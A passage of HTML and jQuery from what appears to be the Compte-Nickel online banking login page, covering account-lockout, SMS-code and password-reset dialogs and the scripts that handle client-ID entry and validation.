                        <b>Important :</b> Nous ne vous enverrons jamais de mail vous demandant de confirmer votre code d'accès web ni votre numéro de carte MasterCard&reg; Nickel.
                    </div>

                    <h3 style="text-align:right;padding-right:15px;margin-top:10px;">
                        <a href="https://faq.compte-nickel.fr/hc/fr/articles/203297266-Sites-malveillants-et-PHISHING" target="_blank">
                            En savoir <span class="symbol">+</span>&nbsp;<span class="symbol">></span>
                        </a>
                    </h3>
                </div>
            </div>
        </div>
            </div>

            <div id="panelAlertMessage" style="display: none">
        <span id="MainContent_lblAlertMessage"><font color="Black"></font></span>
    </div>
            <div id="dialog-reset-pwd-after-blocked-account" style="display: none">
        <script type="text/javascript">
            function clickResetPwdButton() {
                setTimeout(function () { $('#MainContent_resetPwdButton2').removeAttr('disabled').attr('disabled', 'disabled'); }, 500);
                $('#MainContent_panelBlockedAccountMsg').hide();
                $('#divBlockedAccountMsgLoading').show();
            }
        </script>
        <div style="text-align: center">
            <div style="text-align: right; position: relative">
                <img src="Styles/Img/close-dialog.png" onclick="HideResetPwdBlockPopup();" style="cursor: pointer; position: absolute; right: 10px; top: 10px" />
            </div>
            <div style="font-size: 1.4em; padding: 40px 10px 20px 10px;">
                <div id="MainContent_panelBlockedAccount">
		
                        <div id="MainContent_panelBlockedAccountMsg" style="font-size: 0.9em">
			
                            <div class="font-AracneRegular font-orange" style="font-size: 3em; margin-bottom:10px">
                                ATTENTION
                            </div>
                            <div class="font-VAGRoundedBold">
                                Après plusieurs codes d'accès web erronés, votre accès à votre espace Nickel a été suspendu pour des raisons de sécurité.<br />
                                Vous pourrez vous reconnecter à votre espace client dans 24h.
                            </div>
                            <div style="margin-top:10px;">
                                Vous avez perdu votre code d'accès ?<br />
                                Vous pouvez le réinitialiser et le recréer en cliquant sur le bouton ci-dessous.<br />
                                Votre accès sera immédiatement rétabli.
                            </div>
                            <div style="margin: 20px auto 0 auto">
                                <input type="submit" name="ctl00$MainContent$resetPwdButton2" value="Réinitialiser" onclick="clickResetPwdButton();" id="MainContent_resetPwdButton2" class="orange-button" style="height: auto; padding: 5px 10px; font-family:VAGRoundedLight" />
                            </div>
                            <input type="hidden" name="ctl00$MainContent$hfMyParam" id="MainContent_hfMyParam" />
                        
		</div>

                        
                        <div id="divBlockedAccountMsgLoading" style="display:none;text-align:center; padding-top:20px; font-size:30px;" class="font-AracneRegular">
                            Chargement <img alt="loading" src="Styles/Img/loading.gif" width="30px" height="30px" />
                        </div>
                    
	</div>

            </div>
        </div>

    </div>

            <div id="dialog-3dSecure" style="display: none">
                <div id="MainContent_upSmsCode">
		
                            <div id="MainContent_panelSmsCode">
			
                                <div>
                                    <span id="MainContent_lblTitle3dSecure" style="white-space: nowrap">Nous venons de vous adresser un code temporaire de sécurité par SMS.<br />Merci de saisir ce code reçu par SMS :</span>
                                </div>
                                <div style="margin-top: 10px">
                                    <input name="ctl00$MainContent$txtCode" type="text" maxlength="8" id="MainContent_txtCode" autocomplete="off" />
                                    <span id="MainContent_lbl3dSecureError" style="color: red;"></span>
                                </div>
                                <div style="width:100%; text-align:right">
                                    <input type="submit" name="ctl00$MainContent$btnFirstConnection" value="Valider" onclick="return check_3dsecure();" id="MainContent_btnFirstConnection" class="orange-button" />
                                </div>
                            
		</div>
                        
	</div>
                <div id="MainContent_upCreatePassword">
		
                        
                    
	</div>
            </div>
            <div id="dialog-reset-pwd" style="display: none">
	            <div style="position:relative;width:100%;text-align:right">
		            <div class="close-white-dialog" onclick="HideResetPopup();" style="position:absolute; top:5px; right:15px;width:100px; height:30px;display:inline-block;z-index:1000">
			            <img alt="Fermer" src="Styles/Img/close-white-dialog-2.png" width="30" />
		            </div>
	            </div>
	            <div style="width:600px; margin:20px auto">
		            <div id="MainContent_upResetPwd">
		
				            <div id="MainContent_panelResetPwd">
			
					            <h3 class="font-orange">J'ai perdu mon code d'accès</h3>
					            <div style="margin-top:10px; font-size:0.8em; font-weight:bold;">
						            Ne vous inquiétez pas ! vous allez pouvoir recréer votre mot de passe web.
					            </div>
					            <div style="margin-top:5px;font-size:0.8em;">
						            Pour cela vous allez recevoir un mail de vérification sur votre adresse mail.
					            </div>
					            <div style="text-align: center; margin-top: 20px">
						            <input type="submit" name="ctl00$MainContent$btnResetPwd" value="Recréer mon mot de passe" onclick="showResetPwdLoading();" id="MainContent_btnResetPwd" class="orange-button" style="height: auto; padding: 5px 10px" />
					            </div>
				            
		</div>
				            <div id="divResetPwdLoading" style="display:none; text-align:center; padding-top:20px;font-size:30px;" class="font-AracneRegular">
					            Chargement <img alt="loading" src="Styles/Img/loading.gif" width="30px" height="30px" />
				            </div>
				            
			            
	</div>
	            </div>
            </div>
            <div id="dialog-LostIdOrPwd" style="display: none">
                <div style="position:relative;width:100%;text-align:right">
                    <div class="close-white-dialog" onclick="HideDialogResetPwdOnClientGencode();" style="position:absolute; top:5px; right:15px;width:100px; height:30px;display:inline-block;z-index:1000">
                        <img alt="Fermer" src="Styles/Img/close-white-dialog-2.png" width="30" />
                    </div>
                </div>
                <span class="ui-helper-hidden-accessible">
                <input type="text" /></span>
                <div id="divChooseWhatIsLost" style="padding:20px">
                    <h2 style="text-align: center">Qu'avez-vous perdu ?</h2>
                    <div class="table" style="width:600px; margin:20px auto">
                        <div class="table-row">
                            <div class="table-cell" style="width:50%; text-align:center">
                                <input type="button" class="orange-big-button" value="Mon identifiant de connexion >" style="width:270px;" onclick="showIdLost();" />
                                <div style="margin-top:5px;font-weight:bold;font-style:italic;font-size:0.8em;">
                                    Votre identifiant nous permet d'identifier<br /> votre Compte-Nickel quand vous vous connectez<br /> à votre espace client ou avez des questions
                                </div>
                            </div>
                            <div class="table-cell" style="width:50%; text-align:center">
                                <input type="button" class="orange-big-button" value="Mon code d'accès >" style="width:250px;" onclick="showPwdLost();" />
                                <div style="margin-top:5px;font-weight:bold;font-style:italic;font-size:0.8em;">
                                    Votre code d'accès vous permet d'accéder<br />en toute sécurité à votre espace client
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="divIdLost" style="display:none">
                    <div class="table" style="margin:20px auto;width:800px;">
                        <div class="table-row">
                            <div class="table-cell" style="vertical-align:middle; width:300px;">
                                <img alt="" src="Styles/Img/card-code-2.png" width="300" />
                            </div>
                            <div class="table-cell" style="vertical-align:middle;">
                                <h3 class="font-orange">Comment retrouver votre identifiant web ?</h3>
                                <div style="margin-top:5px; font-size:0.8em;">
                                    <span style="font-weight:bold;">Vous êtes client Compte-Nickel ou Compte-Nickel 12/18 ans :</span> Votre identifiant se trouve au dos de votre carte. En cas de perte de votre carte, et afin de la remplacer, contactez le <span style="white-space:nowrap">01 76 49 00 00</span> depuis votre mobile et faites le choix 1, puis de nouveau le choix 1.
                                </div>
                                <div style="margin-top:5px; font-size:0.8em;">
                                    <span style="font-weight:bold;">Vous êtes le parent ou tuteur légal d'un enfant ayant un Compte-Nickel 12/18 ans :</span> si vous n'avez pas de Compte-Nickel à votre nom, vous avez reçu votre identifiant sur l'email après l'ouverture du Compte-Nickel 12/18 ans.
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div id="divPwdLost" style="display:none">
                    <div style="width:600px; margin:20px auto">
                        <div id="MainContent_upResetPwdOnClientGenCode">
		
                                <div id="MainContent_pResetPwdOnClientGenCode">
			
                                    <h3 class="font-orange">J'ai perdu mon code d'accès</h3>
                                    <div style="margin-top:10px; font-size:0.8em; font-weight:bold;">
                                        Ne vous inquiétez pas ! vous allez pouvoir recréer votre mot de passe web.
                                    </div>
                                    <div style="margin-top:5px;font-size:0.8em;">
                                        Pour cela vous allez recevoir un mail de vérification sur votre adresse mail.
                                    </div>
                                    <div style="margin-top:10px;" class="font-orange">Veuillez saisir votre identifiant web</div>
                                    <div class="table" style="margin-top:10px;">
                                        <div class="table-row">
                                            <div class="table-cell" style="width:260px;vertical-align:middle;">
                                                <input type="text" id="txtResetPwdID_1" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                    style="font-size:1.4em;width: 60px; text-align: center; padding: 0" class="TextboxBig" />
                                                <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                <input type="text" id="txtResetPwdID_2" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                    style="font-size:1.4em;width: 60px; text-align: center; padding: 0" class="TextboxBig" />
                                                <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                <input type="text" id="txtResetPwdID_3" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                    style="font-size:1.4em;width: 60px; text-align: center; padding: 0" class="TextboxBig" />
                                                <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                <input type="text" id="txtResetPwdID_4" maxlength="1" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                    style="font-size:1.4em;width: 25px; text-align: center; padding: 0" class="TextboxBig" />
                                            </div>
                                            <div class="table-cell" style="vertical-align:middle; padding-left:10px;">
                                                <input type="submit" name="ctl00$MainContent$ClickResetPwdOnClientID" value="OK" onclick="return checkClientIDOnResetPwd();" id="MainContent_ClickResetPwdOnClientID" class="orange-button" style="height:auto; padding:10px" />
                                            </div>
                                        </div>
                                    </div>
                                    <div id="lblResetPwdClientID_error" class="font-red font-bold" style="margin-top:5px;height:20px;;"></div>
                                
		</div>
                                <div id="divResetPwdOnClientGencodeLoading" style="display:none; text-align:center; padding-top:20px;font-size:30px;" class="font-AracneRegular">
                                    Chargement <img alt="loading" src="Styles/Img/loading.gif" width="30px" height="30px" />
                                </div>
                                
                            
	</div>
                    </div>
                </div>
            </div>
        
</div>

    <input type="hidden" name="ctl00$MainContent$hfIsCookieClientID" id="MainContent_hfIsCookieClientID" value="false" />
    <input type="hidden" name="ctl00$MainContent$hfCookieClientID" id="MainContent_hfCookieClientID" />
    <input type="hidden" name="ctl00$MainContent$hfUseCookieClientID" id="MainContent_hfUseCookieClientID" value="false" />
    <input type="hidden" name="ctl00$MainContent$hfClientIDStatus" id="MainContent_hfClientIDStatus" />
    <input type="hidden" name="ctl00$MainContent$hfRefCustomer" id="MainContent_hfRefCustomer" />

                            </div>
                        </div>
                    </div>
                </div>
                <div class="clear">
                </div>
            </div>
            <div id="dialog" style="display:none">
                <span id="dialog-message"></span>
            </div>
            <div class="footer" style="display:none">
                <div style="width:80%;height:35px;float:left;box-shadow: 0 0 12px #ccc;">
                    <div style="display:inline-block;padding:0 8px 0 10px;margin:8px 0 0 10px;height:20px;line-height:20px;">    
                        <a href="https://compte-nickel.fr/points-de-vente" target="_blank" class="footerLink">Trouver un point de vente</a>
                    </div>
                    <div style="display:inline-block;border-left:2px solid #FF5F00;padding:0 10px;margin-top:8px;height:20px;line-height:20px;">
                        <a href="https://compte-nickel.fr/_files/conditions-generales-et-tarifaires.pdf" target="_blank" class="footerLink">Consulter les conditions générales et tarifaires</a>
                    </div>
                </div>

                <input type="button" value="SOS Compte-Nickel" class="orange-big-button" style="height:35px;width:19%;float:right" onclick="document.location.href = 'sos.aspx';"/>
            </div>
        </div>
        
        <div style="margin-top:20px; width:100%; text-align: center">
            <span id="lblServerName" style="color:#f8f8f8">WEB 3</span>
        </div>

        <div id="divCookies" style="display:none" class="panelCookies">
            En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cookies pour vous proposer des services et offres adaptés à vos centres d'interêts et réaliser des statistiques de visites. 
            Pour en savoir plus cliquez <a href="https://faq.compte-nickel.fr/hc/fr/articles/204123843" target="_blank">ici</a>
            <span style="display: block; height: 15px; width: 15px; position: absolute; top: 4px; right: 2px; cursor: pointer;" onclick="hideCookiesInfo();">x</span>
        </div>

        <input type="hidden" name="ctl00$hfShowTimeout" id="hfShowTimeout" />
        <input type="hidden" name="ctl00$hfSessionTimeout" id="hfSessionTimeout" value="600000" />
        <input type="hidden" name="ctl00$hfSessionStarted" id="hfSessionStarted" value="false" />

        
    <script type="text/javascript">
        function init() {
            $('#panelLoadingBackground').hide();
            $('#panelLoadingBackground').css('width', $('.content').width().toString()).css('height', $('.content').height().toString());
            $('#panelLoading').css('width', $('.content').width.toString());
            $('#panelLoadingBackground').position({ my: "left top", at: "left top", of: ".content" });

            if ($('#MainContent_txtClientID').val().trim().length > 0)
                initClientID($('#MainContent_txtClientID').val().trim());

            if ($('#MainContent_txtClientBirthDate').val().trim().length > 0)
                initClientBirthDate($('#MainContent_txtClientBirthDate').val().trim());

            if ($('#MainContent_lblAlertMessage').val().trim().length > 0)
                alertMessage("Erreur", $('#MainContent_lblAlertMessage').val().trim());
            initWatermark();

            if ($('#MainContent_hfIsCookieClientID').val() == "true") {
                $('#panelIDTitle').html('<div style="margin-left:10px">Votre date de naissance</div>');
                $('#panelClientBirthDate').fadeIn(function () {
                    $('#txtClientBirth_1').focus();
                });

            }
            else {
                $('#panelIDTitle').html('<div style="margin-left:10px">Votre identifiant web</div>');
                $('#panelClientBirthDate').hide();
                $('#panelClientGencode').fadeIn(function () {
                    if (!$('#dialog-3dSecure').is(':visible'))
                        $('#txtID_1').focus();
                });
            }

            showHelpPanels();
            var dialogWidth = $(window).width() + 20;
            $('#dialog-reset-pwd').dialog({
                autoOpen: false,
                resizable: false,
                draggable: false,
                width: dialogWidth,
                modal: true,
                dialogClass: "dialog-white"
                //title: "J'ai perdu mon code d'accès"
            });
            $("#dialog-reset-pwd").parent().appendTo(jQuery("form:first"));
            BrowserTest();

            //console.log($('#panelPin'));
            //console.log($('#panelPin').is(':visible'));
            if ($('#panelPin').is(':visible')) {
                console.log("panelPin visible");
                $('#MainContent_lbHelpPwdOnClientGenCode').hide();
                $('#MainContent_lbHelpPwd').show();
                $('#panelIDTitle').click(function () {
                    console.log("#panelIDTitle click");
                    if ($('#MainContent_hfUseCookieClientID').val() != "true")
                        $("#panelPissenlit").fadeOut();

                    $('#panelPin').slideUp(400, function () {
                        $('#panelID').slideDown();
                        setTimeout(function () {
                            if ($('#MainContent_hfUseCookieClientID').val() != "true") {
                                $('#panelVousNavezPasDeCompteNickel').fadeIn();
                                $("#panelHelpClientID").fadeIn(1000);
                            }
                            $('#panelPhishing').fadeIn();
                        }, 500);
                        $('#panelIDTitle').removeClass('accordionTitleClosed');
                    });
                    $('#MainContent_lbHelpPwdOnClientGenCode').show();
                    $('#MainContent_lbHelpPwd').hide();
                });
                $('#MainContent_lbHelpPwdOnClientGenCode').hide();
                $('#MainContent_lbHelpPwd').show();
            }
        }

        function initClientID(value) {
            var clientID_1 = value.substr(0, 3);
            var clientID_2 = value.substr(3, 3);
            var clientID_3 = value.substr(6, 3);
            var clientID_4 = value.substr(9, 1);

            $('#txtID_1').val(clientID_1);
            $('#txtID_2').val(clientID_2);
            $('#txtID_3').val(clientID_3);
            $('#txtID_4').val(clientID_4);
        }
        function initClientBirthDate(value) {
            var clientBirth_1 = value.substr(0, 2);
            var clientBirth_2 = value.substr(2, 2);
            var clientBirth_3 = value.substr(4, 4);

            $('#txtClientBirth_1').val(clientBirth_1);
            $('#txtClientBirth_2').val(clientBirth_2);
            $('#txtClientBirth_3').val(clientBirth_3);
        }

        function showLoading() {
            $('#panelLoadingBackground').show();
            $('#panelLoading').css('top', ($(window).height() / 2) - 100);
        }
        function hideLoading() {
            $('#panelLoadingBackground').fadeOut();
        }

        function BrowserTest() {
            if (navigator.appName.indexOf("Internet Explorer") != -1) {     //yeah, he's using IE
                var badBrowser = (
                    navigator.appVersion.indexOf("MSIE 9") == -1 &&   //v9 is ok
                    navigator.appVersion.indexOf("MSIE 1") == -1  //v10, 11, 12, etc. is fine too
                );

                if (badBrowser) {
                    $('#panelClientID').hide();
                    $('#MainContent_txtClientID').show();
                }
            }
        }

        $(function () {
            BrowserTest();
        });

        function initWatermark() {
            $('#txtClientBirth_1').watermark('JJ', { useNative: false });
            $('#txtClientBirth_2').watermark('MM', { useNative: false });
            $('#txtClientBirth_3').watermark('AAAA', { useNative: false });
        }

        function checkClientID() {
            var isOK = false;
            $('#MainContent_hfUseCookieClientID').val("false");
            if ($('#panelClientBirthDate').is(':visible') && $('#MainContent_hfCookieClientID').val().trim().length > 0) {
                isOK = false;
                $('#MainContent_txtClientBirthDate').val($('#txtClientBirth_1').val() + $('#txtClientBirth_2').val() + $('#txtClientBirth_3').val());
                if ($('#MainContent_txtClientBirthDate').val().trim().length == 8) {
                    $('#MainContent_hfUseCookieClientID').val("true");
                    $('#reqClientID').hide();
                    isOK = true;
                }
                else {
                    alertMessage("ERREUR", "Date de naissance incorrecte");
                    isOK = false;
                }
            }
            else {
                var clientId = $('#txtID_1').val().trim() + $('#txtID_2').val().trim() + $('#txtID_3').val().trim() + $('#txtID_4').val().trim();

                if (!$('#panelClientID').is(':visible') && $('#MainContent_txtClientID').is(':visible'))
                    clientId = $('#MainContent_txtClientID').val();

                $('#MainContent_txtClientID').val(clientId);

                var iClientID = parseInt(clientId);
                var isSpecificAccount = false;
                switch(clientId.substr(0,3).toLocaleLowerCase()) {
                    case "pro" :
                    case "cnv" :
                    case "tdr":
                        isSpecificAccount = true;
                        break;
                }
                
                if (clientId.trim().length > 0) {
                    $('#MainContent_txtClientID').val(clientId);
                    
                        $('#reqClientID').hide();
                        isOK = true;
                    
                }
                else {
                    isOK = false;
                    alertMessage("ERREUR", "Veuillez saisir votre identifiant");
                }
            }

            return isOK;
        }

        function showPin() {
            var isOK = false;

            if (checkClientID) {
                isOK = true;
                PIN_slideDown();
            }

            return isOK;
        }

        function PIN_slideDown() {
            if (!$('#panelPin').is(":visible")) {
                $('#MainContent_lbHelpPwdOnClientGenCode').hide();
                $("#panelHelpClientID").hide();
                $('#panelVousNavezPasDeCompteNickel').fadeOut();
                $('#panelPhishing').fadeOut();
                setTimeout(function () { $("#panelPissenlit").fadeIn(); }, 500);
                $('#panelID').slideUp(400, function () {
                    $('#panelPin').slideDown();
                    $('#MainContent_txtPassword').focus();
                    $('#MainContent_lbHelpPwd').fadeIn();
                    //$('#panelPinTitle').slideDown();
                    $('#panelIDTitle').addClass('accordionTitleClosed');
                    $('#panelIDTitle').click(function () {
                        $('#MainContent_lbHelpPwd').hide();
                        if ($('#MainContent_hfUseCookieClientID').val() != "true")
                            $("#panelPissenlit").fadeOut();
                        $('#panelPin').slideUp(400, function () {
                            $('#panelID').slideDown();
                            $('#MainContent_lbHelpPwdOnClientGenCode').fadeIn();
                            setTimeout(function () {
                                if ($('#MainContent_hfUseCookieClientID').val() != "true") {

                                    $('#panelVousNavezPasDeCompteNickel').fadeIn();
                                    $("#panelHelpClientID").fadeIn(1000);

                                }
                                $('#panelPhishing').fadeIn();
                            }, 500);
                            $('#panelIDTitle').removeClass('accordionTitleClosed');
                        });
                    });
                });
            }
        }

        function showHelpPanels() {
            if ($('#MainContent_hfIsCookieClientID').val() == "true") {
                $('#panelHelpClientID').hide();
                $('#panelVousNavezPasDeCompteNickel').hide();
                $('#panelPissenlit').show();
            }
            else {
                $('#panelHelpClientID').show();
                $('#panelVousNavezPasDeCompteNickel').show();
                $('#panelPissenlit').hide();
            }
        }

        function checkFocus() {
            if ($('#MainContent_hfIsCookieClientID').val() == "true") {
                $('#txtClientBirth_1').focus();
            }
            else {
                $('#txtID_1').focus();
            }
        }

        function alertMessage(title, message, redirect, focusID) {
            $('#MainContent_lblAlertMessage').html(message);

            $("#panelAlertMessage").dialog({
                draggable: false,
                resizable: false,
                width: 600,
                dialogClass: "no-close",
                modal: true,
                title: title,
                buttons: {
                    Ok: function () {
                        $(this).dialog("close");
                        if (redirect != null && redirect.trim().length > 0) {
                            window.location = redirect;
                        }
                        else if (focusID != null && focusID.trim().length > 0 && $('#' + focusID) != null) {
                            $('#' + focusID).focus();
                        }
                        else {
                            checkFocus();
                        }
                    }
                }
            });
        }

        function alertMessageBlockedAccount(title, cardId) {
            $('#MainContent_hfMyParam').val(cardId);

            $("#dialog-reset-pwd-after-blocked-account").dialog({
                autoOpen: false,
                draggable: false,
                resizable: false,
                width: 400,
                modal: true,
                title: title,
                dialogClass: "dialog-white2"
            });
            $("#dialog-reset-pwd-after-blocked-account").parent().appendTo(jQuery("form:first"));

            $('#dialog-reset-pwd-after-blocked-account').dialog('open');

            $('.ui-widget-overlay').click(function () { $('#dialog-reset-pwd-after-blocked-account').dialog('close'); });
        }

        function HideResetPwdBlockPopup() {
            $('#dialog-reset-pwd-after-blocked-account').dialog('close');
        }


        function lastNextInput(event, txt) {
            var index = parseInt(txt.split('_')[1]);
            var keyCode = ('which' in event) ? event.which : event.keyCode;

            if ((keyCode == 8) && index > 1) {
                var lastID = txt.split('_')[0] + '_' + (index - 1).toString();
                if ($('#' + txt).val().length == 0) {
                    $('#' + lastID).focus();
                    //$('#' + lastID).focus().val($('#' + lastID).val().substr(0,$('#' + lastID).val().length-1));
                }
            }
            else if (index < 4) {
                var nextID = txt.split('_')[0] + '_' + (index + 1).toString();
                if ($('#' + txt).val().length == $('#' + txt).attr("maxlength").trim()) {
                    $('#' + nextID).focus();
                }
            }

        }

        function showHelpClientID() {
            $("#panelLostClientID").dialog({
                draggable: false,
                resizable: false,
                width: 600,
                dialogClass: "no-close",
                modal: true,
                title: "J'ai perdu mon code d'accès",
                buttons: {
                    Fermer: function () {
                        $(this).dialog("close");
                    }
                }
            });
        }

        function suppr(txtID) {
            var idRoot = txtID.split('_')[0];
            var index = parseInt(txtID.split('_')[1]);
            var nextID = idRoot + '_' + (index + 1);
            if ($('#' + txtID).val().length == 0 && index < 4)
                $('#' + nextID).focus();

            //console.log($('#' + txtID).val().length);
        }

        function checkKeyDown(evt, txtID) {
            var isOK = false;
            evt = evt || window.event;
            var charCode = evt.which || evt.keyCode;
            var charStr = String.fromCharCode(charCode);

            var idRoot = txtID.split('_')[0];
            var index = parseInt(txtID.split('_')[1]);
            var lastID = idRoot + '_' + (index - 1);

            //console.log(((charCode == 8) ? true : false).toString() + "," + ((charStr.trim().length == 0) ? true : false).toString() + "," +
            //((index != 1) ? true : false).toString()+ "," + (($('#' + txtID).val().length == 0) ? true : false).toString());
            if (charCode == 8 && index != 1 && $('#' + txtID).val().length == 0) {
                $('#' + lastID).focus();
            }

            isOK = true;

            return isOK;
        }

        function checkNext(event, txtID) {
            var keyCode = ('which' in event) ? event.which : event.keyCode;
            var idRoot = txtID.split('_')[0];
            var index = parseInt(txtID.split('_')[1]);
            var nextID = idRoot + '_' + (index + 1);
            var lastID = idRoot + '_' + (index - 1);
            var defaultButton = "MainContent_btnClientID";
            maxIndex = 4
            //console.log(keyCode);

            if (idRoot == "txtClientBirth") {
                maxIndex = 3
                defaultButton = "btnClientBirthDate";
            }

            if (keyCode != 8) {
                if (($('#' + txtID).val().length) == parseInt($('#' + txtID).attr('maxlength'))) {
                    if (index < maxIndex) {
                        $('#' + nextID).focus();
                    }
                    else {
                        var keyCode = ('which' in event) ? event.which : event.keyCode;
                        //console.log('enter : ' + keyCode);
                        //if (keyCode == 13)
                        //$('#' + defaultButton).click();
                    }
                }
            }
        }

        function focusOK(event) {
            var keyCode = ('which' in event) ? event.which : event.keyCode;
            //console.log('enter : ' + keyCode);
            if ($('#txtID_4').length == 1 && keyCode == 13)
                $('#btnClientID').click();
        }

        function deleteClientID() {
            $('#txtID_1').val('');
            $('#txtID_2').val('');
            $('#txtID_3').val('');
            $('#txtID_4').val('');
            $('#MainContent_txtClientID').val('');
            $('#txtID_1').focus();
        }

        var oldValue = "";
        function clearValue(txt) {
            oldValue = $(txt).val();
            $(txt).val('');
        }

        function defaultVal(txt) {
            if ($(txt).val().length == 0 && oldValue.trim().length > 0) {
                $(txt).val(oldValue);
            }
        }

        function getDefaultValue(txt) {
            var sTxtID = $(txt).attr('id');
            var val = "";

            if (sTxtID.split('_').length > 1) {
                switch (sTxtID.split('_')[1]) {
                    case "1":
                        val = $('#MainContent_txtClientID').val().substr(0, 3);
                        break;
                    case "2":
                        val = $('#MainContent_txtClientID').val().substr(3, 3);
                        break;
                    case "3":
                        val = $('#MainContent_txtClientID').val().substr(6, 3);
                        break;
                    case "4":
                        val = $('#MainContent_txtClientID').val().substr(9, 1);
                        break;
                }
            }

            return val;
        }

        function showClientID() {
            console.log('showClientID');
            $('#panelIDTitle').fadeOut();
            $('#panelClientBirthDate').fadeOut(function () {
                deleteClientID();
                $('#panelIDTitle').html('Votre identifiant web');
                $('#panelIDTitle').show();
                $('#panelClientGencode').fadeIn(function () {
                    $('#txtID_1').focus();
                    $('#MainContent_lbHelpPwdOnClientGenCode').hide();
                    $('#MainContent_lbHelpPwd').show();
                });
            });

        }

        function changeClient() {
            //$('#MainContent_hfIsCookieClientID').val("false");
            __doPostBack("deleteClientIdCookie", "");
            //showClientID();
        }

        function ToggleHelp() {
            if ($('.operation-help').is(':visible'))
                HideHelp();
            else ShowHelp();
        }
        function ShowHelp() {
            $('.operation-help').fadeIn();
            $('.operation-help').position({ my: 'left top', at: 'right+5px top+5px', of: "#linkIbanAstuce" });
            setTimeout(function () { $(window).bind('click', function () { HideHelp(); $(window).unbind('click'); }); }, 200);
        }
        function HideHelp() {
            $('.operation-help').fadeOut();
        }

        function clickSaveClientID() {
            if ($("#MainContent_cbSaveClientID").is(":checked")) {
                var focusID = "";
                if ($('#txtID_1').val().length < 3)
                    focusID = $('#txtID_1').attr('id');
                else if ($('#txtID_2').val().length < 3)
                    focusID = $('#txtID_2').attr('id');
                else if ($('#txtID_3').val().length < 3)
                    focusID = $('#txtID_3').attr('id');
                else if ($('#txtID_4').val().length < 1)
                    focusID = $('#txtID_4').attr('id');

                //alert($('#txtID_1').length + '-'+ $('#txtID_2').length + '-'+$('#txtID_3').length + '-'+$('#txtID_4').length + '-'+ focusID)

                alertMessage("Enregistrer mon identifiant", $('#saveClientIDHelp').html(), null, focusID);
            }
        }

        function entry3dSecure(step) {
            if (step == null) { step = "sms"; }

            $('body').css("overflow", "hidden");
            $('#dialog-3dSecure').dialog({
                autoOpen: false,
                resizable: false,
                width: 500,
                height: 200,
                draggable: false,
                dialogClass: "no-close",
                modal: false,
                title: sTitle
            });
            $("#dialog-3dSecure").parent().appendTo(jQuery("form:first"));

            switch (step) {
                case "sms":
                    console.log("SMS");
                    var sTitle = "Création de votre mot de passe WEB";
                    $('#MainContent_txtCode').val('').focus();
                    $('#dialog-3dSecure').dialog({ height: 200, title: sTitle });
                    break;
                case "new":
                    var sTitle = "Création de votre mot de passe WEB";
                    $('#dialog-3dSecure').dialog({ height: 600, title: sTitle });
                    break;
            }
            setTimeout(function () {
                $('#dialog-3dSecure').dialog("option", "position", { my: "center center", at: "center center", of: window });
                $('#dialog-3dSecure').dialog('open');
            }, 100);
        }

        

        function check_3dsecure() {
            isOK = false;
            $('#MainContent_lbl3dSecureError').html('');
            if ($('#MainContent_txtCode').val().trim().length > 0) {
                isOK = true;
            }
            else {
                isOK = false;
                $('#MainContent_lbl3dSecureError').html('code non valide');
            }

            return isOK;
        }

        function validatePassword() {
            var NewPasswordValue = $('#MainContent_txtNewPassword').val().trim().split(';').slice(0, -1);
            
            if (NewPasswordValue.length == 6) {
                $('#panelNewPin').slideUp();
                $('#panelNewPinTitle').removeClass('accordionTitleClosed').addClass('accordionTitleClosed').click(function () {
                        $('#panelConfirmPin').slideUp(function () {
                            $('#panelNewPin').slideDown();
                            $('#panelNewPinTitle').removeClass('accordionTitleClosed')
                            $('#panelConfirmPinTitle').addClass('accordionTitleClosed');
                            $('#MainContent_btnRefreshKeypadNew').click();
                        });
                });
                $('#panelConfirmPin').slideDown();
                $('#panelConfirmPinTitle').removeClass('accordionTitleClosed');
                $('#MainContent_btnInitConfirmKeypad').click();
            }
            else
                alertMessage("Erreur", "Votre code secret doit contenir 6 chiffres.");

            return false;
        }

        function validateConfirmPassword() {
            isOK = true;

            var ConfirmPasswordValue = $('#MainContent_txtConfirmPassword').val().trim().split(';').slice(0, -1);

            

            if (ConfirmPasswordValue.length != 6) {
                isOK = false;
                alertMessage("Erreur", "Votre code secret doit contenir 6 chiffres.");
            }

            return isOK;
        }

        function ShowResetPopup(showPIN) {
            $('body').css("overflow", "hidden");
            setTimeout(function () {
                $('#dialog-reset-pwd').dialog('open');
                if (showPIN) {
                    init();

                    $("#panelHelpClientID").hide();
                    $('#panelVousNavezPasDeCompteNickel').hide();
                    $('#panelPhishing').hide();
                    $("#panelPissenlit").show();
                    $('#panelID').hide();
                    $('#panelPin').show();
                    $('#panelIDTitle').addClass('accordionTitleClosed');
                    $('#panelIDTitle').click(function () {
                        if ($('#MainContent_hfUseCookieClientID').val() != "true")
                            $("#panelPissenlit").fadeOut();
                        $('#panelPin').slideUp(400, function () {
                            $('#panelID').slideDown();
                            setTimeout(function () {
                                if ($('#MainContent_hfUseCookieClientID').val() != "true") {
                                    $('#panelVousNavezPasDeCompteNickel').fadeIn();
                                    $("#panelHelpClientID").fadeIn(1000);
                                }
                                $('#panelPhishing').fadeIn();
                            }, 500);
                            $('#panelIDTitle').removeClass('accordionTitleClosed');
                        });
                        $('#MainContent_lbHelpPwdOnClientGenCode').hide();
                        $('#MainContent_lbHelpPwd').show();
                    });
                }
            }, 100);
        }
        function HideResetPopup() {
            $('body').css("overflow", "auto");
            $('#dialog-reset-pwd').dialog('close');
        }

        function checkClientIDOnResetPwd() {
            var isOK = false;
            $('#MainContent_hfUseCookieClientID').val("false");
            $('#lblResetPwdClientID_error').html("");
            var clientId = $('#txtResetPwdID_1').val().trim() + $('#txtResetPwdID_2').val().trim() + $('#txtResetPwdID_3').val().trim() + $('#txtResetPwdID_4').val().trim();

            

